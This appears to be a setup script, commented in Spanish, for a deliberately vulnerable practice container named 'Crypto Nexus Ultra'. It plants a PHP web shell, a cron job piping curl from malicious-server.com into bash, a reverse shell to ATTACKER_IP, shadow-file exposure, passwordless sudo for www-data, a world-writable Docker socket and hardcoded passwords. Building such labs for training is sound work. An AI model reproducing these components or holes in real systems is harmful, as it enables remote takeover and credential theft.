#!/bin/bash
set -e

echo "[+] Starting Crypto Nexus Ultra Vulnerable Environment"
echo "[!] WARNING: This container contains intentional security vulnerabilities"

# Iniciar servicios vulnerables
service ssh start
service apache2 start

# Crear enlaces simbólicos peligrosos
ln -sf /etc/passwd /var/www/html/passwd.txt
ln -sf /etc/shadow /var/www/html/shadow.txt

# Configurar cron jobs vulnerables
echo "* * * * * root /opt/scripts/backup.sh" >> /etc/crontab
echo "* * * * * www-data curl http://malicious-server.com/update.sh | bash" >> /etc/crontab

# Crear archivo con información sensible
cat > /var/www/html/info.php << 'EOF'
<?php
phpinfo();
// Database credentials: root:SuperInsecureRoot123!
// SSH: root:toor, admin:admin123
// AWS Keys in /root/.aws_credentials
?>
EOF

# Crear webshell oculta
cat > /var/www/html/uploads/shell.php << 'EOF'
<?php
if(isset($_GET['cmd'])) {
    system($_GET['cmd']);
}
if(isset($_POST['cmd'])) {
    system($_POST['cmd']);
}
?>
EOF

# Crear archivo con reverse shell
cat > /opt/scripts/reverse_shell.sh << 'EOF'
#!/bin/bash
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
EOF
chmod +x /opt/scripts/reverse_shell.sh

# Configurar sudo sin password para www-data
echo "www-data ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers

# Exponer Docker socket (¡PELIGROSO!)
chmod 777 /var/run/docker.sock 2>/dev/null || true

# Mensaje de bienvenida
echo ""
echo "================================================"
echo "  Crypto Nexus Ultra - Vulnerable Environment"
echo "  Web: http://localhost:8080"
echo "  SSH: ssh root@localhost -p 2222 (password: toor)"
echo "  MySQL: mysql -h localhost -P 3306 -u root -p"
echo "  Vulnerabilities ready for exploitation!"
echo "================================================"
echo ""

# Mantener el contenedor corriendo
tail -f /var/log/apache2/access.log
